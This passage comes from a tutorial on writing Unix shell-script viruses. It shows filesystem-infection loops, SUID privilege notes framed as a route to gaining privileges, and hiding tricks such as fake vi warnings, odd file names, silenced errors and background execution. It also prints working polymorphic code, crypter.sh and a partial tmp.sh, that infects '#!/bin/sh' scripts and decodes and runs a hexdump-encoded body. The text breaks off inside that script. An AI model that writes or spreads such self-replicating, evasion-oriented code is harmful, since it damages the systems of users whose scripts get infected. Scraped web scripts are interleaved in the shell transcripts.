+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+<span style="color: #666666; font-style: italic;"># [...]</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># 'dotdot' (&quot;cd ..&quot; recursive)</span><br/>
+dotdot <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">cd</span> <span style="color: #007800;">$1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;$1&quot;</span> = <span style="color: #ff0000;">&quot;/&quot;</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;"># virus code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dotdot <span style="color: #ff0000;">&quot;..&quot;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<span style="color: #666666; font-style: italic;"># [...]</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># Recursive from /</span><br/>
+currentdir <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">cd</span> <span style="color: #007800;">$1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> currentdir <span style="color: #007800;">$F</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;"># virus code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">done</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<span style="color: #666666; font-style: italic;"># [...]</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># find (1)</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-type</span> f<span style="color: black;">&#41;</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;"># [...]</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># find (2)</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-perm</span> +<span style="color: #000000;">111</span> <span style="color: #660033;">-type</span> f <span style="color: #660033;">-exec</span> <span style="color: #c20cb9; font-weight: bold;">sh</span> <span style="color: #660033;">-c</span> <span style="color: #000000; font-weight: bold;">\&quot;</span><span style="color: #666666; font-style: italic;">#virus code...\&quot;</span><br/>
+<span style="color: #666666; font-style: italic;"># [...]</span><br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># Usual scripts</span><br/>
+<span style="color: #007800;">LIST</span>=<span style="color: #ff0000;">&quot;/etc/* /etc/init.d/* /sbin/rc.0/*&quot;</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #007800;">$LIST</span><br/>
+<span style="color: #666666; font-style: italic;"># [...]</span><br/>
+&nbsp;</div>
+<p>The different examples follow what is explained before. I have used a compact notation using the "AND list". This code:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> currentdir <span style="color: #007800;">$F</span></div>
+<p>is equal to:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; currentdir <span style="color: #007800;">$F</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp;</div>
+<p>to do the same but when the "if" does not match the condition we use the "OR list", as explained in chapter 2.2.1.</p>
+<h4><a name="c323"></a>3.2.3. Shell scripts and "su"</h4>
+<p>Scripting with some shells is different if the shell is sh or a derivated shell from sh, such as Bash. Bash is very cautious with scripts with SUID bit set. If we forget to call bash with "-c" option in our SUIDed scripts, Bash will act very strangely and is not able to do certain accesses.</p>
+<p>Let's see it with an example tested in my Linux Debian Potato 2.2.r3:</p>
+<pre class="source"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81ece4c1edeee2e0ede9eef2f5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat > foo.txt
+hello, world!
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="274a42674b4844464b4f485453">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ chmod 644 foo.txt
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2cfc7e2cecdc1c3cecacdd1d6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat > foo.sh
+#!/bin/sh
+cat foo.txt
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ae7efcae6e5e9ebe6e2e5f9fe">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ chmod 4111 foo.sh
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6a070f2a0605090b060205191e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./foo.sh
+bash: ./foo.sh: Permission denied
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acc1c9ecc0c3cfcdc0c4c3dfd8">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat foo.txt
+hello, world!
+</pre>
+<p>As we can see, the system is even more restrictive than the shell itself, as we have access to "foo.txt" from the shell while we don't from the script with "SUID".</p>
+<p>If we do the same with an ELF we'll realize that this kind of executables do not have so many restrictions having the SUID bit set:</p>
+<pre class="source"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1b767e5b7774787a777374686f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat > foo.c
+main(){system("cat foo.txt");}
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="69040c2905060a080501061a1d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ gcc foo.c -o foo
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fc9199bc90939f9d9094938f88">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ chmod 4111 foo
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="68050d2804070b090400071b1c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ chmod 600 foo.txt
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="99f4fcd9f5f6faf8f5f1f6eaed">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ ./foo
+hello, world!
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0a676f4a6665696b666265797e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ su zert
+Password:
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7208170006321e1d11131e1a1d0106">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/home/me$ ./foo
+hello, world!
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3e445b4c4a7e52515d5f5256514d4a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/home/me$ ./foo.sh
+./foo.sh: ./foo.sh: Permission denied
+</pre>
+<p>Other shells (ksh, for instance), don't "drop" the SUID bit. So, if we want to gain privileges attacking and creating SUIDed scripts, we have to remember that is strictly necessary using Bash with "-c" option.</p>
+<h3><a name="c33"></a>3.3. Hiding techniques</h3>
+<h4><a name="c331"></a>3.3.1. Stupid techniques</h4>
+<p>Let's see some stupid hiding techniques. As shell scripts are files that are often opened and edited, is very possible that someone opens an infected file and sees our code. A stupid way to avoid this is to confuse the user as the file is opened.</p>
+<p>A message in a comment like "Rem File edited by Microsoft Windows, do NOT modify!" should be enough for a simple .BAT and an innocent user. The equivalent in UNIX environments could consist on trying to emulate a message that the "vi" editor usualy writes when some other user is editing the same file from another console. The objective is to make the user believe this is happening so he stops editing the file, but in my opinion, a user with a minimum of intelligence would realize of what happens O:-D</p>
+<p>The included text could look like this:</p>
+<p><strong>silly.txt</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;"># Found a swap file by the name &quot;..swp&quot;</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp; dated: Wed Nov 29 15:23:28 2000</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp; owned by: root</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp;file name: ~..swp</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp; modified: no</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp;host name: localhost</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp;user name: root</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp;process ID: 13086 (still running)</span><br/>
+<span style="color: #666666; font-style: italic;"># While opening file &quot;..swp&quot;</span><br/>
+<span style="color: #666666; font-style: italic;"># &nbsp; dated: Wed Nov 29 15:23:27 2000</span><br/>
+<span style="color: #666666; font-style: italic;">#</span><br/>
+<span style="color: #666666; font-style: italic;">#(1) Another program may be editing the same file</span><br/>
+<span style="color: #666666; font-style: italic;"># If this is the case, be careful not to end up with two</span><br/>
+<span style="color: #666666; font-style: italic;"># different instances of the same file when making changes.</span><br/>
+<span style="color: #666666; font-style: italic;"># Quit inmediatly.</span><br/>
+<span style="color: #666666; font-style: italic;">#</span><br/>
+<span style="color: #666666; font-style: italic;">#(2) An edit session for this file crashed.</span><br/>
+<span style="color: #666666; font-style: italic;"># If this is the case, use &quot;:recover&quot; or &quot;vim -r ..swp&quot;</span><br/>
+<span style="color: #666666; font-style: italic;"># to recover the changes (see &quot;:help recovery)&quot;.</span><br/>
+<span style="color: #666666; font-style: italic;"># If you did this already, delete the swap file &quot;..swp&quot;</span><br/>
+<span style="color: #666666; font-style: italic;"># to avoid this message.</span><br/>
+<span style="color: #666666; font-style: italic;">#</span><br/>
+<span style="color: #666666; font-style: italic;"># PRESS ^Z TO QUIT</span><br/>
+&nbsp;</div>
+<p>As I said is a little stupid to try to hide, but there it is as a mere curiosity :-D</p>
+<h4><a name="c332"></a>3.3.2. File names</h4>
+<p>A way of difficulting our detection is to use strange names for the temporary files that we will need. The paradigmatic example is "-". That name, if it is introduced from the console, it is typically interpreted as the standard input (stdin) in stead of the file of name "-".</p>
+<p>A user with a minimum of inteligence could go through this with a command like: "cat ./-".</p>
+<p>Playing with the sameness of the informatical names is also a good way of doing it and names like ".kmem.tmp" or ".core" could be invisible for some users.</p>
+<h4><a name="c333"></a>3.3.3. Code inclusion, the "source" clause</h4>
+<p>As explained in the chapter 3.1.3, using "source" or "." we can let our code in the host be just a simple line, which makes reference to the file that really contains the code.</p>
+<p>Imagine that our virus is in "..." (strange name O:-D), we can assure that it will be executed if we find a line like "source ..." or ". ..." in the hosts code (morse rulz! ;-D).</p>
+<h4><a name="c334"></a>3.3.4. Output messages</h4>
+<p>Capturing the error messages is a must, so they do not appear on the screen and upset the user. Redirecting everything to "/dev/null" we will avoid ugly error messages :-)</p>
+<h4><a name="c335"></a>3.3.5. Execution delays</h4>
+<p>When talking about "residence" we have talked about execution delays of the host. If a script that usually longs just for milliseconds now exceeds up to 20 seconds and makes a lot of use of the hard disk, a minimally inteligent user would try to guess what is going on.</p>
+<p>To avoid this delays the best thing is to dump all the code into a temporary file and execute this file in background. That way, the host will execute normally, and our virus will have time to act even after the host's execution is finished.</p>
+<h4><a name="c336"></a>3.3.6. Aliases</h4>
+<p>Understanding virus size as an exposition factor, using aliases we can reduce our scripts' size. Code readability will be lost, but this fact can be a goodness indeed.</p>
+<h4><a name="c337"></a>3.3.7.- Polimorphism</h4>
+<p>Polymorphic viruses in shell script? Seems a joke, but they can be done :-) There are many ways to "polymorphize" our code:</p>
+<ul>
+<li>insert random comments inside our scripts, like Gobleen Warrior does in his shell scripts ;-) (look his article in 29a#6 for more details).</li>
+<li>use a "crypting" routine for our code and insert useless code inside the ciphered code, as I will explain later.</li>
+<li>use equivalent instructions with different syntax, as we will se in the "decrypter" code.</li>
+<li>make intensive use of the "factor" command and generate "crypted" code in which we can insert random numbers, similar to the explained before.</li>
+</ul>
+<p>As I said, if you want to know how to put in practice the first of the techniques, look in the article Gobleen Warrior wrote, where they are explained in detail. From now on we will explain other techniques.</p>
+<p>When I proposed myself to write a polymorphic virus in shell script I focused on how a polymorphic virus is written: there is a crypting routine and the code varys depending on what technique uses the crypting routine. With this idea in mind I proposed myself to "chiper" my scripts, and what came to my mind was to "hexdump" the script so I could have a hexadecimal dump of my script. This is a group of unreadable characters in which random numbers can be inserted, so it is not a fixed code :-)</p>
+<p>And so, the code is stored as a number string inside a comment in the last line of the script, anda a little routine "decrypts" and executes the code.</p>
+<p>In every instance of the virus the "ciphered" code is different because random numbers have been inserted, and the routine used to "dechipher" the code is also "polymorphized" using different syntaxes to take same actions.</p>
+<p>Let's see this translated into code:</p>
+<p><strong>crypter.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$#</span> <span style="color: #000000; font-weight: bold;">!</span>= <span style="color: #000000;">2</span> <span style="color: black;">&#93;</span><br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;$0, usage: $0 file_src file_dst&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">1</span><br/>
+<span style="color: #000000; font-weight: bold;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">hexdump</span> <span style="color: #ff0000;">&quot;$1&quot;</span><span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #007800;">$2</span><br/>
+<span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp;</div>
+<p>What this simple script does is to dump the result of "hexdump" into the end of a file. We will use it as the first virus generation, as it will be "ciphered" from the beginning. This way, we write what we want our virus to do, we "cipher" it with this script and we paste it at the end of another script which has de "deciphering" routine:</p>
+<pre class="source">
+(virus code) --crypter.sh--\ 
+(decrypt code) ---------------> (decrypt code+virus code crypted)
+</pre>
+<p>and with this we get the firs generation of our polymorphic virus.</p>
+<p>The next script is the decrypted code, which will be dumped into a temporary file by the "deciphering" routine and executed.</p>
+<p><strong>tmp.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$F</span>&quot;</span> = <span style="color: #ff0000;">&quot;-&quot;</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">||</span> <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c9 $F 2&gt;/dev/null)</span>&quot;</span> = <span style="color: #ff0000;">&quot;#!/bin/sh&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">HOST</span>=$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">tr</span> <span style="color: #ff0000;">'\n'</span> \xc7<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-2</span> <span style="color: #007800;">$0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'rm ./- 2&gt;/dev/null'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #007800;">$RANDOM</span> <span style="color: #660033;">-lt</span> <span style="color: #000000;">16386</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'for C in $(tail -2 $0); do [ ${#C} -eq 4 ] &amp;&amp; printf &quot;\x$(expr substr $C 3 2)\x$(expr substr $C 1 2)&quot;&gt;&gt;-; done'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'for P in $(tail -2 $0)'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'do'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' if [ $(expr length $P) -eq 4 ] ; then printf &quot;\x$(expr substr $P 3 2)\x$(expr substr $P 1 2)&quot;&gt;&gt;-; fi'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'done'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'sh ./- $0 &amp;'</span><br/>
